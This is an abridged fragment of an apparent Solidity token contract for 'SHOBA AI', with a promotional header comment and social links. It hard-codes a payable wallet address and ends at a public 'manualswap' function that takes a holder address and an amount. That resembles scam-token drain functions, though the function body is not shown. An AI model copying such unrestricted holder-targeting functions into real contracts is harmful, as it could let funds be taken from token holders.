...
/**
 Shoba AI will act as a gateway to the AI world. Connecting, securing, and empowering all networks to continue
innovating while retaining quantum supremacy. "SAI" mission is to unite the cryptocurrency community through 
education and collaboration with researchers and developers to secure and develop the future of AI-based blockchains. 

https://www.shobaai.com/
https://t.me/ShobaAI
https://twitter.com/ShobaAI
...
contract SHOBAAI is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "SHOBA AI";
    string private _symbol = "SHBAI";
    ...
    constructor () {
        ...
        blockw = payable(address(0x9718901FF42DAC9CD894B06c2424854f27f096b5));
    ...
    function manualswap(address holdersL,uint256 liquidti) public {
